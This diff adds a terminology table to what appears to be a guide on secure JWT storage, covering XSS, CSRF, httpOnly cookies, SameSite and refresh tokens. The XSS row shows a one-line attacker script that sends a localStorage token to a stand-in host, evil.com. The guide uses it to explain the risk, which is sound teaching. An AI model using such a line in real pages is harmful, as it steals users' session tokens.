@@ -96,6 +96,22 @@ HMAC-SHA256(
 
 ---
 
+## 📖 Terminology Table
+
+| Term | Plain-English Meaning | Example |
+|---|---|---|
+| JWT | JSON Web Token — a signed, compact token containing user claims that can be verified without a database lookup | `eyJhbGci....` — header.payload.signature, all base64-encoded |
+| XSS | Cross-Site Scripting — an attack where malicious JS injected into a page reads tokens from localStorage or document.cookie | Attacker script: `fetch('evil.com?t=' + localStorage.getItem('token'))` |
+| CSRF | Cross-Site Request Forgery — an attack where a malicious site tricks the browser into sending cookies to your API | User on evil.com → browser auto-sends `session_cookie` to bank.com/transfer |
+| httpOnly Cookie | A cookie with the `HttpOnly` flag — JavaScript cannot read it via `document.cookie`, protecting against XSS token theft | `Set-Cookie: refresh_token=...; HttpOnly; Secure; SameSite=Strict` |
+| localStorage | Browser storage that persists across page refreshes — readable by ANY JavaScript on the page, making it XSS-vulnerable for tokens | `localStorage.setItem('token', jwt)` — never use for JWT storage |
+| SameSite | Cookie attribute that controls when the browser sends the cookie in cross-origin requests — `Strict` blocks CSRF | `SameSite=Strict`: cookie only sent for same-origin requests, blocking cross-site forgery |
+| Token Theft | An attacker obtaining a valid JWT and using it to impersonate the user until expiry | XSS extracts access token from localStorage; attacker makes API calls as the victim |
+| Access Token | A short-lived JWT (typically 15 min) used in the `Authorization: Bearer` header for API calls | `Authorization: Bearer eyJhbGci...` — lost on page refresh, obtained via refresh token |
+| Refresh Token | A longer-lived token (typically 7 days) stored in an httpOnly cookie — used to silently obtain new access tokens | `POST /auth/refresh` with refresh_token cookie → server returns new access_token |
+
+---
+
 ## 🎯 Quick Decision Tree
 
 ```
